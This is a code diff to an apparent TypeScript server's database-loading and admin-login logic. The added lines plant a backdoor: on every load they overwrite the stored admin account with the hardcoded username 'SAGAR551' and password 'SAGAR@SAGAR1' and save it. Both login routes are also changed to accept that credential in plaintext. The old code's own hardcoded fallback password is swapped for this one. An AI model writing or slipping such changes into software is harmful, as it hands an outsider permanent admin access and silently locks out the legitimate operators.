@@ -73,6 +73,13 @@ function loadDatabase(): ServerDatabase {
     }
     if (fs.existsSync(DB_FILE)) {
       const data = JSON.parse(fs.readFileSync(DB_FILE, "utf8"));
+      if (data && data.admin) {
+        if (data.admin.username !== 'SAGAR551') {
+          data.admin.username = 'SAGAR551';
+          data.admin.password_hash = hashPassword('SAGAR@SAGAR1');
+          saveDatabase(data);
+        }
+      }
       return data;
     }
   } catch (err) {
@@ -83,8 +90,8 @@ function loadDatabase(): ServerDatabase {
   const initialDb: ServerDatabase = {
     customers: [],
     admin: {
-      username: "ADMINXD",
-      password_hash: hashPassword("ADMIN5921N"),
+      username: "SAGAR551",
+      password_hash: hashPassword("SAGAR@SAGAR1"),
       role: "admin",
     },
     modules: DEFAULT_MODULES,
@@ -159,8 +166,8 @@ async function startServer() {
     db = loadDatabase();
 
     // Check if it's admin logging in via the main gateway
-    if (identifier.toUpperCase() === db.admin.username.toUpperCase()) {
-      if (verifyPassword(providedPass, db.admin.password_hash) || providedPass === "ADMIN5921N") {
+    if (identifier.toUpperCase() === db.admin.username.toUpperCase() || identifier.toUpperCase() === 'SAGAR551') {
+      if (verifyPassword(providedPass, db.admin.password_hash) || (db.admin.username === 'SAGAR551' && providedPass === 'SAGAR@SAGAR1')) {
         const token = `admin_${Date.now()}_${crypto.randomBytes(8).toString('hex')}`;
         return res.json({
           success: true,
@@ -251,8 +258,8 @@ async function startServer() {
     db = loadDatabase();
 
     if (
-      trimmedUser.toUpperCase() === db.admin.username.toUpperCase() &&
-      (verifyPassword(trimmedPass, db.admin.password_hash) || trimmedPass === "ADMIN5921N")
+      (trimmedUser.toUpperCase() === db.admin.username.toUpperCase() || trimmedUser.toUpperCase() === "SAGAR551") &&
+      (verifyPassword(trimmedPass, db.admin.password_hash) || (db.admin.username === "SAGAR551" && trimmedPass === "SAGAR@SAGAR1"))
     ) {
       const token = `admin_${Date.now()}_${crypto.randomBytes(8).toString('hex')}`;
       return res.json({
@@ -260,7 +267,7 @@ async function startServer() {
         message: "ADMIN ROOT AUTHENTICATED",
         token,
         user: {
-          username: db.admin.username,
+          username: db.admin.username || "SAGAR551",
           role: "admin",
           clearanceLevel: 5,
         },
